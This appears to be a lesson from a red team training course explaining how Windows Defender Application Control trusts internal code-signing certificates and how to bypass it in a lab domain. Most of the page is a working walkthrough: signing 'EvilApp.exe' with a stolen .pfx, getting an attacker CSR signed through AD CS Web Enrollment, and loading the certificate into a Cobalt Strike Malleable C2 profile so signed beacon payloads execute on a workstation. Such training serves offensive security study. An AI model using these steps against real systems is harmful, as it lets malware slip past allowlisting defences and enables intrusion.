Some organisations build and maintain their own custom [LOB](https://en.wikipedia.org/wiki/Line_of_business) applications which may be signed using an internal certificate authority, such as Active Directory Certificate Services.  Those CAs can be trusted by their WDAC policy, to allow them to sign and deploy their own trusted apps.

WDAC has two levels of certificate policy (three if you count **Root**, but that's currently unsupported).  The first is **Leaf** and the second is **PCA** (short for Private Certificate Authority).  Leaf adds trusted signers at the individual signing certificate level and PCA adds the highest available certificate in the chain (typically one certificate below the root certificate).

Leaf provides more granular control, as every single code-signing certificate issued would have to be trusted individually, but would obviously require more management overhead.  PCA is less robust but easier to manage, because any code-signing certificate issued by a CA can be trusted by WDAC in just a single rule.

  

`SignedApp.exe` on **Workstation 3** is signed using the "SignedApp" certificate, issued by the `redteamops2.local` CA.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/signed-app.png)

  

A LeafCertificate rule would look like this:

```xml
<Signers>
  <Signer ID="ID_SIGNER_S_1" Name="SignedApp">
    <CertRoot Type="TBS" Value="368FEB688B0C60E99D410D4F70B4C952B2741D263C408AE2FBB84C56C15525B5" />
  </Signer>
</Signers>
```

  

A PcaCertificate rule like this:

```xml
<Signers>
  <Signer ID="ID_SIGNER_S_1" Name="Red Team Ops 2 Sub CA">
    <CertRoot Type="TBS" Value="0118C2C3108850353E71D0253A730747A266FDC0AA433A3FF5E087D10C199A73" />
  </Signer>
</Signers>
```

  

If you can find an exported private key (.pfx) and associated password, you can simply use `signtool.exe` from the Windows SDK to sign any binary with it.

```powershell
signtool.exe sign /f SignedAppCert.pfx /p password /fd SHA256 EvilApp.exe
```

  

Another possibility is to have the CA sign your own certificate signing request.  Cobalt Strike can use such a certificate to automatically generated signed payloads.  This can be especially easy to achieve when the Web Enrollment role is installed.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/web-enrollment.png)

  

First, create a Java KeyStore and complete the information fields.  You can enter anything you want, but when we generate a CSR from this keystore, it will be populated with this information and will ultimately appear in the CA.  We should therefore take some care to make the information look somewhat realistic for the target.

```shell
ubuntu@teamserver ~> keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:  HelpSystems LLC
What is the name of your organizational unit?
  [Unknown]:  Hacker Squad
What is the name of your organization?
  [Unknown]:  HelpSystems LLC
What is the name of your City or Locality?
  [Unknown]:  Eden Prairie
What is the name of your State or Province?
  [Unknown]:  MN
What is the two-letter country code for this unit?
  [Unknown]:  US
Is CN=HelpSystems LLC, OU=Hacker Squad, O=HelpSystems LLC, L=Eden Prairie, ST=MN, C=US correct?
  [no]:  yes
```

  

Next, generate the code signing request.

```bash
ubuntu@teamserver ~> keytool -certreq -alias server -file req.csr -keystore keystore.jks
Enter keystore password:

ubuntu@teamserver ~> cat req.csr
-----BEGIN NEW CERTIFICATE REQUEST-----
MIIC8TCCAdkCAQAwfDELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAk1OMRUwEwYDVQQH
EwxFZGVuIFByYWlyaWUxGDAWBgNVBAoTD0hlbHBTeXN0ZW1zIExMQzEVMBMGA1UE
CxMMSGFja2VyIFNxdWFkMRgwFgYDVQQDEw9IZWxwU3lzdGVtcyBMTEMwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCJuDtP/bn4y9Ha6J+Cp/ywjGxtvVET
K1do5eflb3gBxSQIqjZ5cxKZyCsiyCG3ALkbcxXsDRFQBElQWTu5ijyRhaLHOmvd
2CH6Bj+VmSqjuYHgBoIfzM5QKYs+uAdAGzveFwVyrjfL+4fj5TEu5XnnLp4d+L5n
vthpM4ABaaVPk82mlkWpDqlxp2LNp33ZPi9yUiMAkGSoBtWUEl9zXXl3G7jz+Tmd
KVxcqRpwVpJ1ibMZ/w9GcWDxTpPjlNIEDwLRFaJyPTXcoa84Xmm4ow7CHWJpOn7R
kXyR8wB4BTY5m+Tl7cFN8CqCNnCWumnYpls2ol3k771hS4ZB6yK6VIq5AgMBAAGg
MDAuBgkqhkiG9w0BCQ4xITAfMB0GA1UdDgQWBBSo06E0GI83Cdb9aBy68TGozbDV
6zANBgkqhkiG9w0BAQsFAAOCAQEAVLZXnnAgnErJ2NUQC2YFzVVyKXI4sRipxXX9
ZzVMOtm3+Z85Cf4/N2Zn7lgaOnkj+70dHSUxTzj+aj083dewGIWoqCgikbkPgNYs
dNslS4dhXqHM68anYUsRTiNqJ5QAYujmRwxWIVO/6WX6nRDA2ZnNS9cMz1Nt3+zZ
YPf5vJp3EmBU2fi3Eg3VHT/LAVoA441Yqfywg99JT3oB7ERw1BvLJ1VTSPBNbKcE
sToMLXbgJ3HMBZzAiwZaDpUT+KJ7oV4z/H+HFMThASPVy+tTBEONiqwuNIflvxcO
ILYhBwhe7NaYsTvruS3wAogSH9sSg2yVesJ786eKTR5B4eyOfw==
-----END NEW CERTIFICATE REQUEST-----
```
  

On [http://ca.redteamops2.local/certsrv,](http://ca.redteamops2.local/certsrv,) go to **Request a certificate** > **advanced certificate request**.  Paste the CSR into the request box and select **Red Team Ops 2 Code Signing** from the certificate template dropdown.  Then click **Submit**.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/cert-req.png)

  

You'll be redirected to the Certificate Issued page where you can download the certificate.  Select **Download certificate chain** and your browser will download **certnew.p7b**.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/cert-issued.png)

  

Transfer this file onto your team server VM and import it into the keystore.

```bash
ubuntu@teamserver ~> keytool -import -trustcacerts -alias server -file certnew.p7b -keystore keystore.jks
Enter keystore password:

Top-level certificate in reply:

Owner: CN=Red Team Ops 2 Root CA, DC=redteamops2, DC=local
Issuer: CN=Red Team Ops 2 Root CA, DC=redteamops2, DC=local
Serial number: 421987c30cad5faa4854f955aca0717b
Valid from: Thu Feb 03 13:50:33 UTC 2022 until: Sun Feb 03 14:00:33 UTC 2047
Certificate fingerprints:
         SHA1: 88:F6:3E:1F:68:88:DD:C7:5C:C0:DC:C2:F4:F0:2B:C8:31:6C:B1:3E
         SHA256: 8C:21:38:A0:5E:B9:F8:1B:DF:DB:37:49:87:73:50:97:F2:C8:E5:9B:FC:31:70:55:93:4E:AC:37:DC:56:15:70
Signature algorithm name: SHA256withRSA
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3

[...snip...]

... is not trusted. Install reply anyway? [no]:  yes
Certificate reply was installed in keystore
```

  

Copy `keystore.jks` into the cobaltstrike directory and then add the following code block to your Malleable C2 profile:

```shell
code-signer {
        set keystore "keystore.jks";
        set password "password";
        set alias "server";
}
```

  

Restart the team server and go to generate a new EXE payload.  You'll see the **sign executable file** checkbox can now be enabled.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/sign-payload-dialogue.png)

  

Copy the new payload across to **WKSTN-3** and it will execute.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/beacon-signed.exe.png)

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/wdac/beacons.png)